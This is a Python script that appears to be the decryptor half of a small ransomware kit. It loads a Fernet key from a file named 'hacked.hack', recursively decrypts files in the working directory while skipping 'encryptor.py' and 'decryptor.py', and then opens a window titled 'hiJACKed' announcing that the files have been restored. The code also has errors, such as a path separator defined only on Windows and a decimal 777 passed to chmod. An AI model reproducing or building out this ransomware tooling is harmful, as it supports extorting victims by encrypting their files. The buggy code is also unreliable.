import os
import os.path
import platform
import stat
from cryptography.fernet import Fernet
from tkinter import *
from tkinter.ttk import *

files = []

operating_system = platform.system()
print(operating_system)

if operating_system == "Windows":
	print("CWD = C:\\Users\\")
	operator = "\\"
	#cwd = "C:\\Users\\"

cwd = os.getcwd()
os.chmod(cwd, stat.S_IRWXO)
os.chmod(cwd, stat.S_IRWXG)

with open("hacked.hack", "rb") as key:
	secretkey = key.read()

def decrypt(cwd):
	os.chmod(cwd, 777)
	os.chmod(files[0], stat.S_IRWXG)
	with open(files[0], "rb") as thefile:
		contents = thefile.read()

	contents_decrypted = Fernet(secretkey).decrypt(contents)
	os.chmod(files[0], stat. S_IWRITE)

	with open(files[0], "wb") as thefile:
		thefile.write(contents_decrypted)
	files.pop(0)
 	
def folder(newwd):
	cwd = newwd	
	os.chmod(cwd, stat.S_IRWXG)
	for file in os.listdir(newwd):
		os.chmod(file, stat.S_IRWXG)
		if file == "encryptor.py" or file == "hacked.hack" or file == "decryptor.py" or "crypt" in file:
			continue
		
		os.chmod(file, stat.S_IRWXG)
		if os.path.isfile(cwd+file):
			files.append(cwd+file)
			decrypt(cwd)

		os.chmod(file, stat.S_IRWXG)
		if os.path.isdir(cwd+file):
			newwd = ((cwd)+file+operator)
			folder(newwd)
			
cwd = os.getcwd()+operator
for file in os.listdir(cwd):
	if file == "encryptor.py" or file == "hacked.hack" or file == "decryptor.py" or "crypt" in file:
		continue
	if os.path.isfile(file):
		files.append(cwd+file)
		decrypt(cwd)
			
	if os.path.isdir(file):
		newwd = (os.getcwd()+operator+file+operator)
		folder(newwd)

master = Tk()
master.geometry("500x500")
label = Label(master,
		text ="\n""\n""\n""\n""Your files have been restored""\n""\n""\n""\n")
label.pack(pady = 5)
master.title("hiJACKed")
mainloop()